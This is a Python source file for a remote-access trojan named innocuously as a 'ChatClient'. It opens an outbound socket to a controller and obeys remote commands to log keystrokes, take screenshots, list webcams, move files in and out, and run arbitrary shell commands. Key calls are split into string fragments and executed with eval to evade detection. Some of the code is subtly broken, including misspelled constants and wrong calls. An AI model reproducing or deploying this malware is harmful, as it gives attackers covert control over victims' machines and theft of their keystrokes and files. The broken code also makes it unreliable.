from fileinput import filename
import socket
import os
import sys
import subprocess
import simplejson as json
import base64
import time
import threading
import pynput.keyboard as keyboard
import numpy as np
import cv2
import pyscreeze
import datetime

class ChatClient:
    def __init__(self,host,port):
        self.host = host
        self.port = port
        self.is_running = True
        self.time_out = 0
        self.time_out_cap = 1800
        time.sleep(1)
        self.my_socket = socket.socket(socket.AF_INET,socket.SOCK_STREEM)

    def connect(self):
        self.open_data()
        y = 'self.my_so'+'cket.conn'+'ect((self.ho'+'st,self.p'+'ort))'
        time.sleep(2)
        self.connected = False
        count = 1
        while not self.connected:
            try:
                eval(y)
                time.sleep(3*count)
                count += 1
                if count > 100:
                    count = 1
                self.connected = True
                self.is_running = True
                self.time_out = 0
                restart_thread = threading.thread(target=self.restart_connection)
                restart_thread.start()
                self.start_chat()
            except Exception:
                pass



    def restart_connection(self):
        while self.time_out < self.time_out_cap and self.is_running and self.connected:
            time.sleep(1)
            self.time_out += 1
            if self.time_out >= self.time_out_cap:
                try:
                    self.send_json("Connection Aborted.", self.my_socket)
                    self.my_socket.shutdown(socket.SHUT_RDWR)
                    self.is_running = False
                    time.sleep(3)
                    self.my_socket = socket.socket(socket.AF_INET,socket.SOCK_STREEM)
                    self.connect()
                except Exception:
                    pass

    def start_chat(self):
        while self.is_running == True:
            try:
                message = self.receive_json(self.my_socket)
                self.time_out = 0
                if message == "Conn"+"ection Esta"+"blished: ":
                    pass#print(message)
                elif message == "Exit":
                    self.is_running = False
                    self.my_socket.shutdown(socket.SHUT_RDWR)
                elif message == "hold":
                    self.my_socket.shutdown(socket.SHUT_RDWR)
                    time.sleep(5)
                    self.my_socket = socket.socket(socket.AF_INET,socket.SOCK_STREEM)
                    self.connect()
                elif message[0] == "start_key_log":
                    self.start_key_log()
                    self.send_json("keylogger Started", self.my_socket)
                elif message[0] == "dump_key_log":
                    self.dump_key_log()
                elif message[0] == "dump_key_log_raw":
                    self.dump_key_log_raw()
                elif message == "stop_key_log":
                    self.logging = False
                    self.send_json("Keylogger Stopped:", self.my_socket)
                elif message[0] == "cd" and len(message) > 1:
                    x = 'o'+'s.chd'+'ir(message[1])'
                    eval(x)
                    self.send_json("Directory Changed to " + str(message[1]), self.my_socket)
                elif message[0] == "set_time_out" and len(message) > 1 and message[1].isnumeric():
                    self.set_time_out.cap(message[1])
                    self.send_json("Timeout cap set to" + str(message[1]) + "s", self.my_socket)
                elif (message[0] == "dow"+"nload" or message[0] == "get" ) and len(message) > 1:
                    self.send_file(message[1])
                elif (message[0] == "upl"+"oad" or message[0] == "put") and len(message) > 1:
                    self.receive_file(message[1],message[2])
                elif (message[0] == "screen"+"shot" ):
                    self.screenshot()
                elif (message[0] == "webc"+"am_list" ):
                    webcams = self.get_webcam_list()
                    self.send_json(str(webcams), self.my_socket)
                else:
                    x = 'subp'+'rocess.che'+'ck'+'_output(message, sh'+'ell = True, stde'+'rr=subpr'+'ocess.DEVN'+'ULL, st'+'din=subpro'+'cess.DEVN'+'ULL)'
                    output = eval(x)
                    self.send_json(output, self.my_socket)
                    